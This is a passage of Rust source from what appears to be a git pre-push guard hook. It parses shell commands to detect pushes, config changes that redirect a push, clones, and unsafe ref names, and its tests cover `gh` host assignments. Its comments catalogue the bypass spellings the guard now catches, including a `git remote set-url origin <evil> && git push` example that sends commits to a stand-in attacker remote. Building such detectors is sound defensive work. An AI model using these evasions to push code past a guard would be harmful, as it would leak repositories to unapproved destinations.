        Some(at) => (&words[..at], &words[at + 1..]),
        None => (words, &[] as &[String]),
    };
    let mut positionals = Vec::new();
    let mut idx = 0;
    while let Some(word) = own.get(idx) {
        idx += 1;
        match word.as_str() {
            "-u" | "--upstream-remote-name" => idx += 1,
            flag if flag.starts_with('-') => {}
            _ => positionals.push(word),
        }
    }
    let (_, redirects, bare) = clone_words(git_flags);
    let repo = *positionals.first()?;
    let urls = if repo.contains([':', '@']) {
        vec![written_url(Some(repo)).unwrap_or(ConfigRedirect::Unreadable)]
    } else {
        let parts: Vec<&str> = repo.split('/').collect();
        match parts.as_slice() {
            _ if repo.contains(['$', '`']) => vec![ConfigRedirect::Unreadable],
            [owner, name] if !owner.is_empty() && !name.is_empty() => match gh_hosts {
                Some(hosts) => hosts
                    .iter()
                    .map(|host| ConfigRedirect::Url(format!("https://{host}/{owner}/{name}")))
                    .collect(),
                None => vec![ConfigRedirect::Unreadable],
            },
            // A bare `REPO` is the signed-in account's, which gh's own config
            // names (cadence-hooks#1172); no account there, or no host: unreadable.
            [name] if !name.is_empty() => match gh_hosts {
                Some(hosts) => hosts
                    .iter()
                    .map(|host| match user_of(host) {
                        Some(user) => ConfigRedirect::Url(format!("https://{host}/{user}/{name}")),
                        None => ConfigRedirect::Unreadable,
                    })
                    .collect(),
                None => vec![ConfigRedirect::Unreadable],
            },
            [host, owner, name] if [host, owner, name].iter().all(|p| !p.is_empty()) => {
                vec![ConfigRedirect::Url(format!(
                    "https://{host}/{owner}/{name}"
                ))]
            }
            _ => vec![ConfigRedirect::Unreadable],
        }
    };
    let default_dir = humanish_directory(repo, bare);
    Some(clone_write(
        urls,
        positionals.get(1).copied(),
        default_dir,
        redirects,
        dir,
    ))
}

/// Does this `-c`/`--config-env` setting redirect a push (cadence-hooks#1131)?
///
/// Real git sends `git -c remote.origin.pushurl=<url> push origin main` and
/// `git -c url.<base>.insteadOf=<prefix> push origin main` to the `-c` URL,
/// while the guard's `git remote get-url --push` probe runs without the `-c`
/// and answers with the configured one.
///
/// Section and variable names are case-insensitive to git, so they are
/// compared folded, after the same unescape [`sets_push_ref_computation`]
/// applies. A `--config-env` value names an environment variable, so a URL
/// key arriving that way is never readable. `insteadOf` rewrites are refused
/// rather than applied: the result depends on the configured URL and git's
/// longest-prefix rule, and applying them here would mean re-implementing
/// that to decide a safety question. `include.path` and
/// `includeIf.<cond>.path` load a file that can hold any of these keys.
fn config_push_redirect(setting: &str, from_env: bool) -> ConfigRedirect {
    let setting = unescape_word(setting);
    let (key, value) = match setting.split_once('=') {
        Some((key, value)) => (key, Some(value)),
        None => (setting.as_ref(), None),
    };
    let key = key.to_ascii_lowercase();
    let names = |section: &str, variables: &[&str]| {
        key.strip_prefix(section)
            .is_some_and(|rest| variables.iter().any(|variable| rest.ends_with(variable)))
    };
    if key == "include.path"
        || names("includeif.", &[".path"])
        || names("url.", &[".insteadof", ".pushinsteadof"])
    {
        return ConfigRedirect::Unreadable;
    }
    let readable = value.filter(|v| !from_env && !v.is_empty() && !v.contains(['$', '`']));
    // Keys that pick WHICH remote a bare push uses (cadence-hooks#1156).
    if key == "remote.pushdefault" || names("branch.", &[".pushremote", ".remote"]) {
        return readable.map_or(ConfigRedirect::Unreadable, |remote| {
            ConfigRedirect::Remote(remote.to_string())
        });
    }
    if !names("remote.", &[".url", ".pushurl"]) {
        return ConfigRedirect::None;
    }
    readable.map_or(ConfigRedirect::Unreadable, |url| {
        ConfigRedirect::Url(url.to_string())
    })
}

/// Commands that only read a file named on their command line. Any other verb
/// naming a git config file is taken to write it (cadence-hooks#1156).
const READS_ONLY: &[&str] = &[
    "cat",
    "less",
    "more",
    "head",
    "tail",
    "grep",
    "egrep",
    "fgrep",
    "rg",
    "ag",
    "bat",
    "wc",
    "ls",
    "stat",
    "file",
    "diff",
    "cmp",
    "echo",
    "printf",
    "test",
    "[",
    "realpath",
    "readlink",
    "md5sum",
    "sha1sum",
    "sha256sum",
    "shasum",
];

/// The config writes one segment makes that can change where a LATER push
/// goes (cadence-hooks#1156). The guard probes the repository before the
/// command runs, so `git remote set-url origin <evil> && git push origin main`
/// was judged against the old `origin`.
///
/// - `git remote add <name> <url>` and `git remote set-url <name> <url>`: the
///   URL, judged like a `-c remote.<name>.url=` one; `set-url --delete` and
///   `rename` are unreadable, since what is left depends on the config.
/// - `git config` setting a key [`config_push_redirect`] reads: its value.
///   Unsetting one, renaming or removing a `remote`/`url`/`branch`/`include`
///   section, or `--edit` is unreadable. Reads (`--get`, `--list`, a lone key)
///   write nothing. Every scope counts — `--global`, `--system` and `--file`
///   can reach the repository as easily as `--local`.
/// - a write redirect into a git config file, or any verb outside
///   [`READS_ONLY`] naming one: unreadable.
fn config_writes_of(
    argv: &[String],
    argv_quoted: &[usize],
    tokens: &[String],
    unquoted_prefix_lens: &[usize],
    dir: &str,
    known_ok: bool,
    gh_hosts: &GhHosts,
) -> Vec<ConfigRedirect> {
    let mut writes = Vec::new();
    // Every output redirection, glued (`x>>.git/config`) or not. One whose
    // operator follows a quote is kept too: the marks cannot tell `a"b">f`
    // from `a">"f`, and ambiguity keeps blocking.
    if crate::shell::token_redirects(tokens, unquoted_prefix_lens)
        .iter()
        .any(|redirect| {
            redirect.operator.contains('>')
                && redirect
                    .target
                    .as_deref()
                    .is_some_and(|target| names_git_config_file(target, dir))
        })
    {
        writes.push(ConfigRedirect::Unreadable);
    }

    let operands = strip_unquoted_redirections(argv, argv_quoted);
    let Some((verb, words)) = operands.split_first() else {
        return writes;
    };
    let verb = command_word(verb);
    if verb == "gh" {
        let words: Vec<String> = words
            .iter()
            .map(|word| unescape_word(word).into_owned())
            .collect();
        if words.first().is_some_and(|word| word == "repo")
            && words.get(1).is_some_and(|word| word == "clone")
        {
            let prefix = &tokens[..tokens.len().saturating_sub(argv.len())];
            let hosts = inline_gh_host(prefix).unwrap_or_else(|| {
                if gh_hosts.unreadable {
                    Err(())
                } else {
                    Ok(gh_hosts.hosts.clone())
                }
            });
            let user_of = |host: &str| gh_hosts.signed_in_user(host);
            writes.extend(gh_clone_write(
                &words[2..],
                dir,
                hosts.as_deref().ok(),
                &user_of,
            ));
        }
        return writes;
    }
    if verb != "git" {
        if !READS_ONLY.contains(&verb.as_ref())
            && words.iter().any(|word| names_git_config_file(word, dir))
        {
            writes.push(ConfigRedirect::Unreadable);
        }
        return writes;
    }
    let words: Vec<String> = words.iter().map(|word| (*word).clone()).collect();
    let globals = git_globals(&words, dir, known_ok);
    let Some((subcommand, rest)) = globals.rest.split_first() else {
        return writes;
    };
    let rest: Vec<String> = rest
        .iter()
        .map(|word| unescape_word(word).into_owned())
        .collect();
    match unescape_word(subcommand).as_ref() {
        "remote" => writes.extend(git_remote_writes(&rest)),
        "config" => writes.extend(git_config_writes(&rest)),
        "clone" if globals.unreadable_dir || globals.foreign_redirect => {
            writes.push(ConfigRedirect::Clone {
                dest: None,
                redirects: Vec::new(),
            });
        }
        "clone" => writes.extend(git_clone_write(&rest, &globals.work_dir)),
        _ => {}
    }
    writes
}

/// Does `word` name a git config file — a repository's `config` (bare or
/// not, and a linked worktree's `config.worktree`), `~/.gitconfig`,
/// `/etc/gitconfig`, or `$XDG_CONFIG_HOME/git/config`? A path the shell
/// builds (`$GIT_DIR/config`) counts when its text ends in `config`.
fn names_git_config_file(word: &str, dir: &str) -> bool {
    let word = unescape_word(word);
    let word = word.trim_end_matches('/');
    if !word.to_ascii_lowercase().contains("config") {
        return false;
    }
    if word.contains(['$', '`']) {
        return true;
    }
    let path = resolve_cd_target(word, dir).to_ascii_lowercase();
    path.ends_with("gitconfig")
        || path.ends_with("config.worktree")
        || (path.ends_with("/config") && (path.contains(".git/") || path.ends_with("/git/config")))
}

/// A literal URL value, or unreadable.
fn written_url(value: Option<&String>) -> Option<ConfigRedirect> {
    let value = value?;
    Some(if value.is_empty() || value.contains(['$', '`']) {
        ConfigRedirect::Unreadable
    } else {
        ConfigRedirect::Url(value.clone())
    })
}

/// The writes a `git remote …` makes; `words` are the unescaped words after
/// `remote`.
fn git_remote_writes(words: &[String]) -> Option<ConfigRedirect> {
    let mut words = words
        .iter()
        .skip_while(|word| matches!(word.as_str(), "-v" | "--verbose"));
    let subcommand = words.next()?;
    let args: Vec<&String> = words.collect();
    let positionals = |value_options: &[&str]| {
        let mut out = Vec::new();
        let mut idx = 0;
        while let Some(word) = args.get(idx) {
            if value_options.contains(&word.as_str()) {
                idx += 2;
                continue;
            }
            if !word.starts_with('-') {
                out.push(*word);
            }
            idx += 1;
        }
        out
    };
    match subcommand.as_str() {
        "add" => written_url(
            positionals(&["-t", "--track", "-m", "--master"])
                .get(1)
                .copied(),
        ),
        "set-url" if args.iter().any(|word| *word == "--delete") => {
            Some(ConfigRedirect::Unreadable)
        }
        "set-url" => written_url(positionals(&[]).get(1).copied()),
        "rename" => Some(ConfigRedirect::Unreadable),
        _ => None,
    }
}

/// Could this `git config` key or section name decide where a push goes?
fn names_push_config_section(word: &str) -> bool {
    let word = word.to_ascii_lowercase();
    ["remote", "url", "branch", "include"]
        .iter()
        .any(|section| word.starts_with(section))
}

/// The writes a `git config …` makes; `words` are the unescaped words after
/// `config`. Both grammars: the option form (`--unset`, `--get`) and the
/// subcommand form (`set`, `unset`, `get`) of git 2.46.
fn git_config_writes(words: &[String]) -> Option<ConfigRedirect> {
    const VALUE_OPTIONS: &[&str] = &[
        "-f",
        "--file",
        "--blob",
        "--type",
        "--default",
        "--comment",
        "--value",
    ];
    let mut positionals: Vec<&String> = Vec::new();
    let (mut reads, mut removes, mut edits) = (false, false, false);
    let mut options_ended = false;
    let mut idx = 0;
    while let Some(word) = words.get(idx) {
        if !options_ended && word == "--" {
            options_ended = true;
        } else if !options_ended && word.starts_with('-') && word.len() > 1 {
            match word.as_str() {
                "--get" | "--get-all" | "--get-regexp" | "--get-urlmatch" | "--get-color"
                | "--get-colorbool" | "-l" | "--list" => reads = true,
                "--unset" | "--unset-all" | "--rename-section" | "--remove-section" => {
                    removes = true;
                }
                "-e" | "--edit" => edits = true,
                _ => {}
            }
            if VALUE_OPTIONS.contains(&word.as_str()) {
                idx += 1;
            }
        } else {
            positionals.push(word);
        }
        idx += 1;
    }
    match positionals.first().map(|word| word.as_str()) {
        Some("list" | "get") => reads = true,
        Some("edit") => edits = true,
        Some("unset" | "rename-section" | "remove-section") => {
            removes = true;
            positionals.remove(0);
        }
        Some("set") => {
            positionals.remove(0);
        }
        _ => {}
    }
    if edits {
        return Some(ConfigRedirect::Unreadable);
    }
    if reads {
        return None;
    }
    let touches_push_config = positionals
        .iter()
        .any(|word| names_push_config_section(word));
    if removes {
        return touches_push_config.then_some(ConfigRedirect::Unreadable);
    }
    let (Some(key), Some(value)) = (positionals.first(), positionals.get(1)) else {
        // A lone key is a read.
        return None;
    };
    match config_push_redirect(&format!("{key}={value}"), false) {
        // A key this reading does not recognise, next to one it does: an
        // option it does not model has shifted the words, so the write
        // cannot be read.
        ConfigRedirect::None if touches_push_config && !names_push_config_section(key) => {
            Some(ConfigRedirect::Unreadable)
        }
        ConfigRedirect::None => None,
        redirect => Some(redirect),
    }
}

/// Does this `-c`/`--config-env` setting name a key that decides which refs a
/// bare `git push` publishes?
///
/// `setting` is git's `key=value` (or `key=ENVVAR`) word; only the KEY matters.
/// Two keys qualify, the same two [`implicit_push_config_unresolvable`] reads
/// from the repository: `push.default`, and any `remote.<name>.push` refspec.
///
/// Section and variable names are case-insensitive to git, so the comparison is
/// too. `remote.<name>.pushurl` deliberately does NOT match — it changes where
/// the push goes, not which refs it carries.
///
/// The setting is unescaped first, for the same reason the flag word is: git
/// reads it after the shell removes the escapes, so `-c push.\default=matching`
/// really does set `push.default` (measured — `config --get push.default`
/// answers `matching`) while a raw compare read some other key and left the
/// invocation resolvable.
fn sets_push_ref_computation(setting: &str) -> bool {
    let setting = unescape_word(setting);
    let key = setting
        .split_once('=')
        .map_or(setting.as_ref(), |(key, _)| key);
    let key = key.to_ascii_lowercase();
    key == "push.default"
        || (key.starts_with("remote.")
            && key.ends_with(".push")
            && key.len() > "remote..push".len())
}

/// Read one segment's argv as a `git push`, or `None` when it is not one.
///
/// `argv` is the prefix-/runner-peeled token view. The verb goes through
/// [`command_word`], so `/usr/bin/git push` and the alias-escaping `\git push`
/// resolve as the pushes they are; `push` stays case-sensitive because git's
/// subcommands are.
fn push_invocation_of(
    argv: &[String],
    argv_quoted: &[usize],
    effective_dir: &str,
    known_ok: bool,
) -> Option<PushInvocation> {
    // **Redirections come out FIRST — before the verb, the globals and the
    // subcommand are read.** A redirection is legal anywhere in a simple
    // command, so all three of those reads could be handed a redirect token
    // where they expect a word, and each failed by returning `None`:
    // `git >log push origin main`, `git 2>/dev/null push origin main` and
    // `>log git push origin main` all run under bash, zsh and sh (measured — a
    // redirect between the command word and its arguments is transparent to
    // git) and every one of them was NO PUSH SEEN. Stripping only at the operand
    // scan, as the first cut did, left that whole surface untouched.
    //
    // Reading a redirect as a refspec was the other half, and this module's
    // first FALSE-REFUSAL class: `git push origin main > /dev/null` collected
    // `main`, `>` and `/dev/null`, `is_safe_ref` rejected `>`, and the range came
    // back `Unresolved` for the spelling every script uses.
    // `git push > log origin main` was worse — `>` was read as the REPOSITORY.
    //
    // The strip is quote-aware, and moving it earlier is exactly why it has to
    // be: a wider surface would otherwise mean a wider misread of a quoted
    // operand (cadence-hooks#237 security review, F24 and F26).
    let argv: Vec<String> = strip_unquoted_redirections(argv, argv_quoted)
        .into_iter()
        .cloned()
        .collect();
    if command_word(argv.first()?) != "git" {
        return None;
    }
    let globals = git_globals(&argv[1..], effective_dir, known_ok);
    let (subcommand, words) = globals.rest.split_first()?;
    // `push` stays case-SENSITIVE — a git subcommand is — but it takes the same
    // backslash removal the verb does: `git pu\sh origin main` really pushes
    // (measured), and a literal compare read it as some other subcommand and
    // dropped the segment.
    if unescape_word(subcommand) != "push" && !alias_is_plain_push(&globals.aliases, subcommand) {
        if !alias_hides_a_push(&globals.aliases, subcommand) {
            return None;
        }
        return Some(PushInvocation {
            work_dir: globals.work_dir,
            refspecs: vec![Refspec {
                raw: "HEAD".to_string(),
                source: Some("HEAD".to_string()),
                destination: None,
                is_delete: false,
                implicit: true,
            }],
            all_or_mirror: false,
            tags: false,
            dry_run: false,
            mirror: false,
            follow_tags: None,
            recurse_submodules: None,
            unresolved: true,
            repository_unresolved: globals.foreign_redirect,
            directory_unverified: globals.unreadable_dir,
            config_destinations: globals.config_destinations,
            destination_unreadable: true,
            config_remotes: globals.config_remotes,
            repository: None,
            via_alias: false,
        });
    }

    // Already stripped, at the top of this function — see the note there.
    let scan = scan_push_words(words);
    let mut refspecs: Vec<Refspec> = scan
        .refspecs
        .iter()
        .map(|raw| parse_refspec(raw, scan.delete_flag))
        .collect();
    let implicit = refspecs.is_empty();
    if implicit {
        // What a bare `git push` (or `git push origin`) publishes is decided by
        // `push.default` and by any `remote.<name>.push` refspec, NOT by this
        // module. `HEAD` is the answer under `simple`, `current` and `upstream`
        // — the default and the modes anything ships with — and it is WRONG
        // under `matching`, which publishes every same-named local branch.
        // So `HEAD` is recorded as the assumption, flagged `implicit`, and the
        // two settings that break it mark the invocation `unresolved`: the
        // repository's, read by [`implicit_push_config_unresolvable`], and the
        // command's own `-c`/`--config-env`, which that probe cannot see.
        refspecs.push(Refspec {
            raw: "HEAD".to_string(),
            source: Some("HEAD".to_string()),
            destination: None,
            is_delete: false,
            implicit: true,
        });
    }

    Some(PushInvocation {
        work_dir: globals.work_dir,
        refspecs,
        all_or_mirror: scan.all_or_mirror,
        tags: scan.tags,
        dry_run: scan.dry_run,
        mirror: scan.mirror,
        follow_tags: scan.follow_tags,
        recurse_submodules: scan.recurse_submodules,
        unresolved: globals.foreign_redirect
            || globals.unreadable_dir
            || (implicit && globals.push_config_override),
        repository_unresolved: globals.foreign_redirect,
        directory_unverified: globals.unreadable_dir,
        config_destinations: globals.config_destinations,
        destination_unreadable: globals.destination_unreadable,
        config_remotes: globals.config_remotes,
        repository: {
            let named = crate::shell::push_repository_argument(words);
            named.positional.or(named.repo_flag)
        },
        via_alias: unescape_word(subcommand) != "push",
    })
}

/// What a walk of `git push`'s own option grammar found.
struct PushWordScan {
    /// Positional words after the first — the first positional is git's
    /// repository argument, every later one is a refspec.
    refspecs: Vec<String>,
    all_or_mirror: bool,
    tags: bool,
    dry_run: bool,
    delete_flag: bool,
    mirror: bool,
    follow_tags: Option<bool>,
    recurse_submodules: Option<String>,
}

/// Walk the words AFTER `push`, separating options from positionals.
///
/// The option grammar is the one [`crate::shell::push_repository_argument`]
/// models — same separate-value long options, same `-o` short-cluster rule —
/// but this walk collects EVERY positional rather than stopping at the first,
/// because the ones after the repository are the refspecs.
fn scan_push_words(words: &[String]) -> PushWordScan {
    let mut scan = PushWordScan {
        refspecs: Vec::new(),
        all_or_mirror: false,
        tags: false,
        dry_run: false,
        delete_flag: false,
        mirror: false,
        follow_tags: None,
        recurse_submodules: None,
    };
    let mut positionals = 0usize;
    let mut options_ended = false;
    let mut index = 0;

    while index < words.len() {
        let raw = words[index].as_str();
        // **Options are read unescaped; the positional stays raw.** Argv proof,
        // all three shells: `printf "[%s]" --t\ags --mirr\or -\-all` yields
        // `[--tags][--mirror][--all]`. Comparing the raw word turned
        // `--a\ll` into an unrecognised option — the repository swallowed the
        // next word, no refspec was collected, and the implicit `HEAD` shipped
        // with `unresolved: false` while git published every branch. A
        // positional keeps its escape because a refspec goes to
        // [`is_safe_ref`], which correctly refuses a backslash.
        let word = unescape_word(raw);
        let word = word.as_ref();

        if !options_ended && word == "--" {
            options_ended = true;
            index += 1;
            continue;
        }

        if !options_ended && let Some(rest) = word.strip_prefix("--") {
            fn split_name(long: &str) -> (&str, Option<&str>) {
                match long.split_once('=') {
                    Some((name, value)) => (name, Some(value)),
                    None => (long, None),
                }
            }
            let (name, inline) = split_name(rest);
            // The same derivation over the RAW word, computed HERE beside its
            // unescaped twin rather than re-spelled at the `--dry-run` test
            // below. Two spellings of one derivation drift, and one edit to the
            // option grammar would change only one of them.
            let raw_name = raw.strip_prefix("--").map(|long| split_name(long).0);
            // `--all`/`--mirror` matched by PREFIX, the way git's parse-options
            // resolves an unambiguous abbreviation. Over-matching here only
            // widens the range a caller scans, so an ambiguous prefix git would
            // reject costs nothing.
            // `--branches` is git's alias of `--all` (2.44+ spells it in `-h`);
            // no other push option starts with `b`, so any prefix selects it.
            if abbreviates("all", name)
                || abbreviates("mirror", name)
                || abbreviates("branches", name)
            {
                scan.all_or_mirror = true;
            }
            // `--tags` widens the same way and is tracked separately — see the
            // field's docs. `--follow-tags` fails this test (`"tags"` does not
            // start with `"follow-tags"`) and is correctly non-widening.
            if abbreviates("tags", name) {
                scan.tags = true;
            }
            // Exact, both of them, and for opposite reasons. `dry-run` licenses
            // an allow, so a loose match is a bypass. `delete` skips a refspec,
            // so a loose match is a miss. Under-matching either only over-blocks.
            //
            // `dry-run` is additionally the ONE arm read on the RAW word: every
            // other test here fires more often once unescaped, which widens what
            // is scanned, while this one would license an allow. Under-matching
            // `--dry-\run` costs a false block on a harmless command.
            if raw_name == Some("dry-run") {
                scan.dry_run = true;
            }
            if name == "delete" {
                scan.delete_flag = true;
            }
            // Recorded for a caller that tells `--mirror` from `--all`, and
            // that follows tags or submodules; none of the three changes a
            // field above.
            if abbreviates("mirror", name) {
                scan.mirror = true;
            }
            // `--fol` is the shortest unambiguous `--follow-tags`: git rejects
            // `--fo` as ambiguous with `--force-if-includes` (measured, 2.43),
            // and the same holds for `--no-fo` against `--no-force-if-includes`.
            match name {
                _ if name.len() >= 3 && abbreviates("follow-tags", name) => {
                    scan.follow_tags = Some(true);
                }
                _ if name.len() >= 6 && abbreviates("no-follow-tags", name) => {
                    scan.follow_tags = Some(false);
                }
                "no-recurse-submodules" => scan.recurse_submodules = Some("no".to_string()),
                _ if name.starts_with("recu") && abbreviates("recurse-submodules", name) => {
                    scan.recurse_submodules = inline
                        .map(str::to_string)
                        .or_else(|| words.get(index + 1).map(|w| unescape_word(w).into_owned()));
                }
                _ => {}
            }
            let takes_separate_value =
                inline.is_none() && crate::shell::long_option_takes_separate_value(name);
            index += if takes_separate_value { 2 } else { 1 };
            continue;
        }

        if !options_ended && let Some(cluster) = word.strip_prefix('-').filter(|c| !c.is_empty()) {
            // `-o` is `git push`'s only value-taking shorthand, so the cluster's
            // FLAG span ends at the first `o`; everything after it is that
            // option's glued value. Scanning the whole token for `n` instead
            // would read `-ono` — `-o` with the value `no` — as a dry run, and a
            // false `dry_run` is a real push allowed unscanned.
            let flags = match cluster.find('o') {
                Some(position) => &cluster[..=position],
                None => cluster,
            };
            // Short `-n` reads the RAW cluster, for the same reason the long
            // `--dry-run` does: it is the only allow-licensing arm.
            let raw_flags = raw
                .strip_prefix('-')
                .map(|c| match c.find('o') {
                    Some(position) => &c[..=position],
                    None => c,
                })
                .unwrap_or("");
            if raw_flags.contains('n') {
                scan.dry_run = true;
            }
            if flags.contains('d') {
                scan.delete_flag = true;
            }
            let value_is_next_word =
                matches!(cluster.find('o'), Some(pos) if pos + 1 == cluster.len());
            index += if value_is_next_word { 2 } else { 1 };
            continue;
        }

        positionals += 1;
        // The first positional is the repository; the rest are refspecs. The
        // RAW word is kept — [`is_safe_ref`] refuses a backslash, so an escaped
        // refspec reaches the caller as unresolvable rather than as a guess.
        if positionals > 1 {
            scan.refspecs.push(raw.to_string());
        }
        index += 1;
    }

    scan
}

/// Is `candidate` a non-empty prefix of `full` — the abbreviation rule git's
/// parse-options applies to long option names?
fn abbreviates(full: &str, candidate: &str) -> bool {
    !candidate.is_empty() && full.starts_with(candidate)
}

/// Read one refspec word into its local and remote sides.
///
/// `[+]<src>[:<dst>]`. A leading `+` is force, not part of the ref. An empty
/// source (`:dead`) is a deletion, as is anything under a command-level
/// `--delete`.
fn parse_refspec(raw: &str, delete_flag: bool) -> Refspec {
    let body = raw.strip_prefix('+').unwrap_or(raw);
    let (source, destination) = match body.split_once(':') {
        Some((s, d)) => (s, Some(d.to_string())),
        None => (body, None),
    };
    let is_delete = delete_flag || source.is_empty();
    Refspec {
        raw: raw.to_string(),
        source: (!is_delete && !source.is_empty()).then(|| source.to_string()),
        destination: destination.or_else(|| (!is_delete).then(|| source.to_string())),
        is_delete,
        implicit: false,
    }
}

/// The commits a push of `source_ref` would put on a remote that lacks them.
///
/// **Task A owes two things this type cannot enforce.** A push that reaches
/// [`OutboundRange::Unavailable`] must block or nudge loudly, never allow —
/// history size alone can drive a first push into the deadline, so the
/// fail-open arm is reachable without an adversary. And the commit cap must be
/// applied *before* buffering: this call holds the whole `rev-list` stdout,
/// which on a first push is the entire history, with no size bound of its own.
#[derive(Debug, PartialEq, Eq)]
pub enum OutboundRange {
    /// The commit shas, newest first. **Empty is a real answer** — genuinely
    /// nothing to push — and is the ONLY shape a caller may read as "allow".
    Commits(Vec<String>),
    /// git ran and refused to resolve the range (an unknown ref, a corrupt
    /// repository, a ref this module declined to hand to git at all). A caller
    /// must NOT read this as an empty range: that read is what turns a git
    /// error into a silent allow.
    Unresolved,
    /// The guard's own infrastructure failed — git could not be spawned, or the
    /// hook deadline expired. ADR-0001 fail-open territory, and distinct from
    /// [`OutboundRange::Unresolved`] so a caller can treat the two differently.
    Unavailable,
}

/// Resolve the outbound commit set for one pushed ref.
///
/// **The argument order is the whole correctness of this function.**
/// `git rev-list <ref> --not --remotes` lists commits reachable from `<ref>`
/// and from no remote-tracking ref. Writing it `--not --remotes <ref>` — the
/// spelling this plan's first draft carried — puts `<ref>` on the NEGATED side
/// too, so the set is always empty and every push is allowed. A guard built on
/// that could not have gone red.
///
/// **A first push has no `refs/remotes/*` at all, so the range is the entire
/// history.** That is the common case, not an edge: any fresh branch's first
/// `push -u` resolves this way. A caller therefore needs a commit cap, and the
/// cap is a correctness backstop rather than a nicety.
///
/// Accepted residual: `--remotes` spans EVERY remote, so a commit already on a
/// fork is excluded even though pushing to `origin` publishes it there.
pub fn outbound_commits(work_dir: &str, source_ref: &str) -> OutboundRange {
    if !is_safe_ref(source_ref) {
        return OutboundRange::Unresolved;
    }
    // The trailing `--` pins every earlier word as a revision, so a ref that
    // also names a file in the tree cannot make git ask which was meant.
    match git_output_detailed(
        work_dir,
        &["rev-list", source_ref, "--not", "--remotes", "--"],
    ) {
        GitOutput::Ok(text) => OutboundRange::Commits(
            text.lines()
                .map(str::trim)
                .filter(|line| !line.is_empty())
                .map(str::to_string)
                .collect(),
        ),
        GitOutput::Failed => OutboundRange::Unresolved,
        GitOutput::Unavailable | GitOutput::TimedOut => OutboundRange::Unavailable,
    }
}

/// May this string be handed to git as a revision?
///
/// **An allowlist, not a denylist.** The value comes off a command line this
/// tool did not write, and it lands in `git`'s argv — where a leading `-` makes
/// it an OPTION. `git rev-list --output=/tmp/x --not --remotes` writes a file;
/// other option spellings change what the command means entirely. Enumerating
/// the dangerous spellings means tracking git's option surface forever, so this
/// admits only what it can vouch for and refuses everything else, unknown
/// spellings included.
///
/// The refusal is not a fail-open: a caller reads it as
/// [`OutboundRange::Unresolved`], which blocks.
///
/// The shape rules are git-check-ref-format's, minus the ones the charset
/// already covers: no leading `-` (option), `/` (not a ref) or `.`, no `..` or
/// `//`, no trailing `/` or `.lock`. `HEAD` and `refs/heads/topic` pass.
pub fn is_safe_ref(candidate: &str) -> bool {
    !candidate.is_empty()
        && candidate.len() <= 255
        && candidate
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'/' | b'-'))
        && !candidate.starts_with(['-', '/', '.'])
        && !candidate.ends_with('/')
        && !candidate.ends_with(".lock")
        && !candidate.contains("..")
        && !candidate.contains("//")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::git_fixtures::{Scratch, git_in, init_repo};
    use std::path::{Path, PathBuf};

    fn scratch_root() -> PathBuf {
        Path::new(env!("CARGO_MANIFEST_DIR")).join("../../target/core-push-scratch")
    }

    /// The local sides of every refspec across every detected push, flattened —
    /// the view most assertions here care about.
    fn sources(command: &str, cwd: &str) -> Vec<String> {
        push_invocations(command, cwd)
            .into_iter()
            .flat_map(|invocation| invocation.refspecs)
            .filter_map(|refspec| refspec.source)
            .collect()
    }

    #[test]
    fn gh_hosts_read_every_literal_assignment_and_refuse_the_rest() {
        // (command, unreadable, hosts added beyond the inherited one)
        for (command, unreadable, added) in [
            ("gh repo clone o/r", false, &[][..]),
            (
                "export GH_HOST=Other.Example; gh repo clone o/r",
                false,
                &["other.example"][..],
            ),
            (
                "GH_HOST=a.example gh repo clone o/r",
                false,
                &["a.example"][..],
            ),
            (
                "export GH_HO\"ST\"=b.example; gh repo clone o/r",
                false,
                &["b.example"][..],
            ),
            ("unset GH_HOST; gh repo clone o/r", false, &[][..]),
            ("export GH_HOST; gh repo clone o/r", false, &[][..]),
            (
                "MY_GH_HOST=x GH_HOSTNAME=y gh repo clone o/r",
                false,
                &[][..],
            ),
            ("export GH_HOST=$H; gh repo clone o/r", true, &[][..]),
            ("export GH_HOST=a/b; gh repo clone o/r", true, &[][..]),
            (": ${GH_HOST:=x}; gh repo clone o/r", true, &[][..]),
            ("echo $GH_HOST; gh repo clone o/r", true, &[][..]),
            ("read GH_HOST; gh repo clone o/r", true, &[][..]),
            ("export GH_HOS${T}=x; gh repo clone o/r", true, &[][..]),
            ("GH_HOST+=x gh repo clone o/r", true, &[][..]),
            (
                "n=GH_HOST; export $n=x; gh repo clone o/r",
                true,
                &["x"][..],
            ),
            ("export ${n}=x; gh repo clone o/r", true, &[][..]),
            ("read -r \"$n\"; gh repo clone o/r", true, &[][..]),
            ("read -a $n; gh repo clone o/r", true, &[][..]),
            ("mapfile -t $n; gh repo clone o/r", true, &[][..]),
            ("getopts ab $n; gh repo clone o/r", true, &[][..]),
            ("printf -v \"$n\" x; gh repo clone o/r", true, &[][..]),
            ("printf -v$n x; gh repo clone o/r", true, &[][..]),
            ("printf -v GH_HOST x; gh repo clone o/r", true, &[][..]),
            ("eval \"$x\"; gh repo clone o/r", true, &[][..]),
            ("eval `cat f`; gh repo clone o/r", true, &[][..]),
            (
                "eval \"$(direnv export bash)\"; gh repo clone o/r",
                true,
                &[][..],
            ),
            (
                "eval \"$(ssh-agent -s; echo x)\"; gh repo clone o/r",
                true,
                &[][..],
            ),
            (
                "ssh-agent(){ :; }; eval \"$(ssh-agent -s)\"; gh repo clone o/r",
                true,
                &[][..],
            ),
            (
                "pyenv(){ :; }; eval \"$(pyenv init -)\"; gh repo clone o/r",
                true,
                &[][..],
            ),
            // A non-literal VALUE is not a non-literal NAME.
            (
                "export PATH=\"$HOME/.cargo/bin:$PATH\" && gh repo clone o/r",
                false,
                &[][..],
            ),
            (
                "local x=$(date) y=\"$z\"; gh repo clone o/r",
                false,
                &[][..],
            ),
            (
                "eval \"$(ssh-agent -s)\" && gh repo clone o/r",
                false,
                &[][..],
            ),
            (
                "eval \"$(brew shellenv)\"; gh repo clone o/r",
                false,
                &[][..],
            ),
            (
                "eval \"$(pyenv init -)\"; gh repo clone o/r",
                false,
                &[][..],
            ),
            ("eval 'echo hi'; gh repo clone o/r", false, &[][..]),
            ("printf '%s\\n' \"$x\"; gh repo clone o/r", false, &[][..]),
            (
                "printf -v out '%s' \"$x\"; gh repo clone o/r",
                false,
                &[][..],
            ),
            (
                "read -r -p \"$prompt\" answer; gh repo clone o/r",
                false,
                &[][..],
            ),
            ("read -r line < \"$f\"; gh repo clone o/r", false, &[][..]),
        ] {
            let hosts = GhHosts::for_command(command);
            assert_eq!(hosts.unreadable, unreadable, "{command}");
            assert_eq!(&hosts.hosts[1..], added, "{command}");
        }
    }

    #[test]
    fn inline_gh_host_reads_the_prefix() {
        let words =
